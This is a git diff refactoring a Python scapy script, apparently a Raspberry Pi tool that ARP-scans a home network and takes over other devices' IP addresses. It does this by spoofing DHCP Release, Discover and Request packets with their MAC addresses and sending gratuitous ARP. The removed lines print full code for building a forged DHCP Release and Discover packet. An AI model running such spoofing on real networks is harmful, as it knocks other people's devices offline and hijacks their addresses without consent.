@@ -2,192 +2,29 @@
 # Performs a targeted ARP Request scan to find existing hosts connected to network and "steal" their IP addresses
 # 1. 
 # 2. 
+
+
 #### IMPORTS #### -------------------------------------------------------------------
 import scapy.all as scapy
-import time
+#import time
 import json
 import threading
-#import logging
-#from logging.handlers import TimedRotatingFileHandler
-#import random
-#from datetime import datetime
 import subprocess
 from common import *
 from utils import setup_logging, write_to_log, file_semaphore
 
 
 #### CONFIG #### -------------------------------------------------------------------
-#iface = "eth0"  # Network interface to spoof
 timeout_to_receive_arp_reply = 5 # Time to wait to receive ARP Reply (seconds)
 timeout_to_receive_dhcp_response = 30 # seconds
 time_to_wait_between_release_and_discover = 5 # seconds
-#delay_between_arp_scans = 120  # seconds
-#json_file = "/home/pi/dhcp_starver/spoofed_hosts.json"
 log_file = "/home/pi/dhcp_starver/logs/dhcp_spoof.log"
 
-'''
-#### GLOBAL VARIABLES #### ---------------------------------------------------------
-# Dict of all spoofed ip addresses k:IP, v:fake_host
-#spoofed_ip_dict = dict()
 
-# List to store captured DHCP packets
-captured_packets = []
-
-# DHCP Server's IP and MAC address
-dhcp_server_ip = ""
-dhcp_server_mac = ""
-
-# Our own device's network parameters
-our_ip_address = ""
-our_mac_address = ""
-our_netmask = ""
-our_network = ""
-
-'''
 setup_logging(log_file)
 
-'''
-# Define a semaphore for .log/.json file access without collision
-file_semaphore = threading.Semaphore()
 
-# Set up logging with rotation policy
-handler = TimedRotatingFileHandler(log_file, when="midnight", interval=1, backupCount=7, encoding='utf-8', utc=True)
-handler.suffix = "%Y-%m-%d"
-handler.setLevel(logging.INFO)
-formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
-handler.setFormatter(formatter)
-logger = logging.getLogger()
-logger.addHandler(handler)
-logger.setLevel(logging.INFO)
-
-# Set up scapy logger to error
-logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
-
-'''
 #### FUNCTIONS #### ----------------------------------------------------------------
-'''
-def write_to_log(message):
-    """
-    Write message to log file
-    """
-    with file_semaphore:
-        logger.info(message)
-'''
-'''
-def load_from_json(file_path, semaphore):
-    """
-    Load json file contents to a dictionary
-    """
-    
-    # Load json contents to a dictionary
-    write_to_log(f"Loading results from {file_path}")
-
-    try:
-        with semaphore:
-                with open(file_path, 'r') as file:
-                    data = json.load(file)
-        # Create a dict with fake_host objects
-        file_dict = {}
-        for ip, host_data in data.items():
-            file_dict[ip] = fake_host.from_dict(host_data)
-        
-
-    # Return an empty dict if something goes wrong
-    except FileNotFoundError:
-        write_to_log(f"File not found: {json_file}")
-        file_dict = {}
-    except json.JSONDecodeError as e:
-        write_to_log(f"Error decoding JSON file: {e}")
-        file_dict = {}
-    except Exception as e:
-        write_to_log(f"Unknown error during file read: {e}")
-        file_dict = {}
-
-    return file_dict
-    '''
-'''
-OLD
-def load_from_json(file_path):
-    """
-    Load JSON file contents to a dictionary.
-    Raises exceptions to be handled by the caller.
-    """
-    try:
-        with file_semaphore:
-            with open(file_path, 'r') as file:
-                data = json.load(file)
-        
-        file_dict = {ip: fake_host.from_dict(host_data) for ip, host_data in data.items()}
-        return file_dict
-
-    except FileNotFoundError as e:
-        raise FileNotFoundError(f"File not found: {file_path}") from e
-    except json.JSONDecodeError as e:
-        raise json.JSONDecodeError(f"Error decoding JSON file: {e}", e.doc, e.pos)
-    except Exception as e:
-        raise Exception(f"Unknown error during file read: {e}") from e
-'''
-'''
-OLD
-def save_to_json(results, file_path):
-    """
-    Save a dictionary to a json file. If results is an empty dictionary, flush json file
-    """
-
-    # If results is an empty dictionary, flush json file
-    if not results:
-        with open(file_path, 'w') as file:
-            pass  
-    serializable_dict = {ip: host.to_dict() for ip, host in results.items()}
-
-    # Sort the dictionary by IP address
-    sorted_dict = dict(sorted(serializable_dict.items(), key=lambda item: ipaddress.ip_address(item[0])))
-
-    # Save the sorted dictionary to a file
-    with file_semaphore:
-        with open(file_path, 'w') as file:
-            json.dump(sorted_dict, file, indent=4)
-
-    write_to_log(f"Results saved in {file_path}")
-'''
-'''
-def save_to_json(results, file_path, semaphore):
-    """
-    Save a dictionary to a json file. If results is an empty dictionary, flush json file
-    """
-
-    # If results is an empty dictionary, flush json file
-    if not results:
-        with open(file_path, 'w') as file:
-            pass  
-    serializable_dict = {ip: host.to_dict() for ip, host in results.items()}
-
-    # Sort the dictionary by IP address
-    sorted_dict = dict(sorted(serializable_dict.items(), key=lambda item: ipaddress.ip_address(item[0])))
-
-    # Save the sorted dictionary to a file
-    try:
-        with semaphore:
-            with open(file_path, 'w') as file:
-                json.dump(sorted_dict, file, indent=4)
-    except Exception as e:
-        raise Exception(f"Error saving JSON file: {e}") from e
-    #write_to_log(f"Results saved in {file_path}")
-'''
-'''
-def update_json_file(updated_ip_dict, file_path):
-        """
-        Update json file with new information. Load + Update + Save
-        """
-        # Load previous results from json file
-        dict_on_file = load_from_json(file_path)
-
-        # Update previous results with new hosts' information
-        for ip, host in updated_ip_dict.items():
-            dict_on_file[ip] = host
-
-        save_to_json(dict_on_file, file_path)
-'''
 
 def update_json_file(updated_ip_dict, file_path):
         """
@@ -231,34 +68,6 @@ def get_unspoofed_ips(network_ip_addresses, spoofed_ip_dict):
         # If an error occurs, return the whole address list
         return network_ip_addresses
 
-'''
-def create_dhcp_discover_packet(host):
-    """
-    Creates a broadcast DHCP Discover with host's parameters
-    """
-    mac_address = host.mac_address
-    # Converting MAC address from typical format to a 16 bytes sequence, needed for BOOTP/DHCP header 
-    host_mac = int(mac_address.replace(":", ""), 16).to_bytes(6, "big")
-    # Making DHCP Discover packet
-    ether_header = scapy.Ether(src=host_mac, 
-                               dst="ff:ff:ff:ff:ff:ff")
-    ip_header = scapy.IP(src="0.0.0.0", 
-                         dst="255.255.255.255")
-    udp_header = scapy.UDP(sport=68, 
-                           dport=67)
-    bootp_field = scapy.BOOTP(chaddr=host_mac, 
-                              xid=host.transaction_id,
-                              flags=0) # Unicast
-                              #flags=0x8000) # Broadcast
-    dhcp_field = scapy.DHCP(options=[("message-type", "discover"),
-                                     ("client_id", b'\x01' + host_mac),
-                                     ('param_req_list', [53, 54, 51, 1, 6, 3, 50]),  
-                                     ("hostname", host.hostname), 
-                                     "end"])
-    dhcp_discover = (ether_header/ip_header/udp_header/bootp_field/dhcp_field)
-
-    return dhcp_discover
-'''
 
 def release_and_catch(existing_host_mac, existing_host_ip):
     """
@@ -282,7 +91,8 @@ def release_and_catch(existing_host_mac, existing_host_ip):
 
 def perform_dhcp_discover_offer(host):
     """
-    
+    Perform a DHCP Discover-Offer transaction. 
+    If a DHCP Offer is received, continues with Request-ACK
     """
 
     # Create new DHCP Discover packet
@@ -367,67 +177,6 @@ def perform_dhcp_request_ack(host):
             write_to_log(f"Unknown DHCP response received: DHCP.MessageType = {dhcp_request_packet[scapy.DHCP].options[0][1]}")
             return
 
-'''
-def process_dhcp_packet(transaction_id, timeout):
-    """
-    Periodically checks for a DHCP packet matching the transaction.
-    """
-    start_time = time.time()
-    while time.time() - start_time < timeout:
-
-        for pkt in captured_packets:
-
-            # Check if packet if DHCP and it's transaction id matches our current transaction
-            if scapy.DHCP in pkt:
-
-                if pkt[scapy.BOOTP].xid == transaction_id:
-
-                    captured_packets.remove(pkt)
-                    return pkt
-                
-                # If an foreign ACK is received, it's interesting to know who gets what ip address
-                elif pkt[scapy.DHCP].options[0][1] == 5:
-
-                    host_mac = mac_to_str(pkt[scapy.BOOTP].chaddr)
-                    host_ip = pkt[scapy.BOOTP].yiaddr
-                    write_to_log(f"Received unknown DHCP ACK: {host_ip} linked to {host_mac}")
-                    captured_packets.remove(pkt)
-            
-        time.sleep(0.5)
-
-    return None
-'''
-'''
-def send_release(host_mac, ip_address, delay, server_ip, server_mac):
-    """
-    Send DHCP Release
-    """
-    # Getting a random Trans ID
-    trans_id = random.getrandbits(32)
-    # Converting MAC addresses
-    mac_address = int(host_mac.replace(":", ""), 16).to_bytes(6, "big")
-    formatted_server_mac = int(server_mac.replace(":", ""), 16).to_bytes(6, "big")
-    # Making DHCP Release packet
-    ether_header = scapy.Ether(src=mac_address, 
-                               dst=formatted_server_mac)
-    ip_header = scapy.IP(src=ip_address, 
-                         dst=server_ip)
-    udp_header = scapy.UDP(sport=68, 
-                           dport=67)
-    bootp_field = scapy.BOOTP(chaddr=mac_address,
-                              ciaddr=ip_address,
-                              xid=trans_id,
-                              flags=0)
-    dhcp_field = scapy.DHCP(options=[("message-type", "release"),
-                                     ("server_id", server_ip),
-                                     "end"])
-    dhcp_request = (ether_header/ip_header/udp_header/bootp_field/dhcp_field)
-
-    scapy.sendp(dhcp_request, verbose=False, iface=iface)
-    
-    # Wait for t seconds to try to catch that released IP address
-    time.sleep(delay)
-'''
 
 def send_gratuitous_arp(host_mac, host_ip):
     """
@@ -477,6 +226,18 @@ def arp_scan(target_ips):
             global dhcp_server_ip, dhcp_server_mac
             dhcp_server_ip = ip
             dhcp_server_mac = mac
+            # Save that "new" host to dictionary
+            router = fake_host.create_host(ip)
+            router.mac_address = mac
+            router.acquisition_time = datetime.now()
+            router.lease_time = 999999
+            # It's not really spoofed but this will avoid spoofing attemps 
+            router.is_spoofed = True
+            router.is_server = True
+            router.hostname = "Router"
+            aux_dict = {}
+            aux_dict[ip] = router
+            update_json_file(aux_dict, json_file)
             # Removing router from responsive devices list
             responsive_devices.remove((ip,mac))
             break
@@ -505,7 +266,6 @@ def get_dhcp_leases():
     return dhcp_leases
 
 
-
 def check_if_router(ip_address):
     """
     Check if that IP address belongs to home network's router/DHCP server
@@ -522,20 +282,20 @@ def main():
     
     write_to_log(f"Starting DHCP spoofing proccess")
     # Get network interface assigned IP address and network network mask
-    global our_ip_address, our_netmask
     our_ip_address, _, our_netmask, _ = get_network_params(iface)
     
     # Getting all host avalaible IP addresses for network
     network_ip_addresses = get_hosts_from_network(our_ip_address, our_netmask)
 
     # Load previous spoofed hosts from json file
-    #global spoofed_ip_dict
     spoofed_ip_dict = load_from_json(json_file, file_semaphore)
 
     # Get a list with non spoofed host's IP addresses checking spoofed_ip_dict
     target_ips = get_unspoofed_ips(network_ip_addresses, spoofed_ip_dict)
+
     # Perform an ARP scan
     ip_mac_data = arp_scan(target_ips)
+
     # Prints found devices on network
     if ip_mac_data:
         write_to_log(f"Found connected and unspoofed device(s):")
@@ -545,6 +305,7 @@ def main():
         write_to_log(f"No other devices found")
         write_to_log(f"Service Terminated")
         exit()
+
     # Getting Pi-hole DHCP Server's IP lease list
     spoofed_hosts = get_dhcp_leases()
 
@@ -566,4 +327,4 @@ if __name__ == "__main__":
     try:
         main()
     except KeyboardInterrupt as e:
-        write_to_log(f"Service terminated")
+        write_to_log(f"Service manually terminated")
